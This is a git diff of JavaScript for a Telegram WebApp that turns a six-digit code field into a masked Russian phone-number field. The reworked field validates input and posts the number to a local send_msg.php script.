@@ -2,38 +2,54 @@ let tg = window.Telegram.WebApp;
 tg.expand();
 tg.enableClosingConfirmation();
 
-tg.MainButton.text = "Отправить код";
+tg.MainButton.text = "Подтвердить номер";
 tg.MainButton.show();
-let passwordInput = document.querySelector('input');
+let phoneInput = document.querySelector('input');
+let flag = true;
+
+const phoneMask = new IMask(phoneInput, {
+  mask: "+7 (000) 000-00-00"
+});
 
 document.addEventListener( 'click', (e) => {
-	const withinBoundaries = e.composedPath().includes(passwordInput);
+	const withinBoundaries = e.composedPath().includes(phoneInput);
+  console.log(withinBoundaries);
 	if (! withinBoundaries ) {
-		passwordInput.blur();
+    console.log("снятие фокуса")
+		phoneInput.blur();
 	} else{
-    passwordInput.focus();
+    console.log("фокусирование");
+    phoneInput.focus();
+    /*
+    if (flag){
+      phoneInput.value = '+7 (';
+      flag = false;
+    }
+    */
   }
 });
 
-passwordInput.addEventListener("input", passwordInputHandler);
+phoneInput.addEventListener("input", phoneInputHandler);
 
-function passwordInputHandler(){
-  if (passwordInput.value.length == 6){
-    passwordInput.classList.add('correctInput');
-    passwordInput.classList.remove('incorrectInput');
+function phoneInputHandler(){
+  if (phoneMask.masked.isComplete){
+    phoneInput.classList.add('correctInput');
+    phoneInput.classList.remove('incorrectInput');
   } else{
-    passwordInput.classList.remove('correctInput');
+    phoneInput.classList.remove('correctInput');
   }
 }
 
 tg.MainButton.onClick(function(){
-  passwordInput.blur();
-  if (passwordInput.classList.value == 'correctInput'){
+  phoneInput.blur();
+  if (phoneInput.classList == 'correctInput'){
     fetch("send_msg.php", {
       method: "POST",
-      body: passwordInput.value
+      body: phoneMask.unmaskedValue
     })
+    /*window.location.href = 'http://example.com';*/
+    console.log("отправка сообщения")
   }else{
-      passwordInput.classList.add('incorrectInput');
+    phoneInput.classList.add('incorrectInput');
   }
 });
